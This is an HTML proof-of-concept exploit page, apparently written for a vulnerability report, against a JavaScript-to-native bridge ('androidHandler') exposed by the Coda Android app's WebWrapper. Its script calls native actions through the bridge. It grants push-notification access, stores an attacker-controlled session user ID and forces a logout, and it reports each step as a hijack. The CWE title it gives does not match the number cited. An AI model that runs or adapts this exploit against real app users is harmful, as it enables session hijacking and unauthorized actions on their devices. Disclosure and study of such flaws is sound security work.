<!DOCTYPE html>
<html>
<head>
    <title>Coda WebWrapper Bridge Exploitation</title>
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
        .box { border: 2px solid #00ff00; padding: 15px; margin: 10px 0; }
        .success { background: #001a00; border-color: #00ff00; }
        .error { background: #1a0000; border-color: #ff0000; }
        h1 { color: #00ff00; }
    </style>
</head>
<body>
    <h1>ğŸ”´ CODA WEBWRAPPER VULNERABILITY PROOF ğŸ”´</h1>
    
    <div id="results"></div>

    <script>
        const results = document.getElementById('results');
        
        function log(msg, type = 'info') {
            const box = document.createElement('div');
            box.className = `box ${type}`;
            box.textContent = msg;
            results.appendChild(box);
            console.log('[' + type.toUpperCase() + ']', msg);
        }

        log('Checking for androidHandler bridge...');

        // âœ… TEST 1: Bridge exists
        if (typeof androidHandler !== 'undefined') {
            log('âœ… SUCCESS: androidHandler bridge is EXPOSED!', 'success');
            log('This proves io.coda.codaapp.WebWrapper is vulnerable to JavaScriptâ†’Native code execution', 'success');
            
            try {
                // âœ… TEST 2: Call GetSupportedFeatures (safe test)
                const payload1 = JSON.stringify({ action: "GetSupportedFeatures" });
                const resp1 = androidHandler.postMessage(payload1);
                log('âœ… GetSupportedFeatures() executed: ' + resp1, 'success');

                // âœ… TEST 3: Call sensitive action - AcceptPushNotifications
                const payload2 = JSON.stringify({ action: "AcceptPushNotifications" });
                androidHandler.postMessage(payload2);
                log('âœ… AcceptPushNotifications() executed - User notification access HIJACKED!', 'success');

                // âœ… TEST 4: StoreSessionData (CRITICAL - Session Hijacking)
                const payload3 = JSON.stringify({ 
                    action: "StoreSessionData",
                    userId: "ATTACKER_CONTROLLED_ID_" + Date.now()
                });
                androidHandler.postMessage(payload3);
                log('ğŸ”´ CRITICAL: StoreSessionData() executed - SESSION CAN BE HIJACKED!', 'success');

                // âœ… TEST 5: Trigger Logout
                const payload4 = JSON.stringify({ action: "Logout" });
                androidHandler.postMessage(payload4);
                log('âš ï¸ Logout triggered - User will be forced to re-authenticate!', 'success');

                log('â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”', 'success');
                log('VULNERABILITY CONFIRMED: io.coda.codaapp.WebWrapper exposed dangerous bridge!', 'success');
                log('CWE-749: Exposure of Private Information to an Unauthorized Actor', 'success');
                log('CVSS Score: 8.2 (HIGH)', 'success');
                
            } catch(e) {
                log('Error: ' + e.message, 'error');
            }
        } else {
            log('âŒ androidHandler NOT found. This page is not running in vulnerable Coda App.', 'error');
            log('(This is expected if you\'re viewing this in a browser, not the Coda Android App)', 'error');
        }
    </script>
</body>
</html>
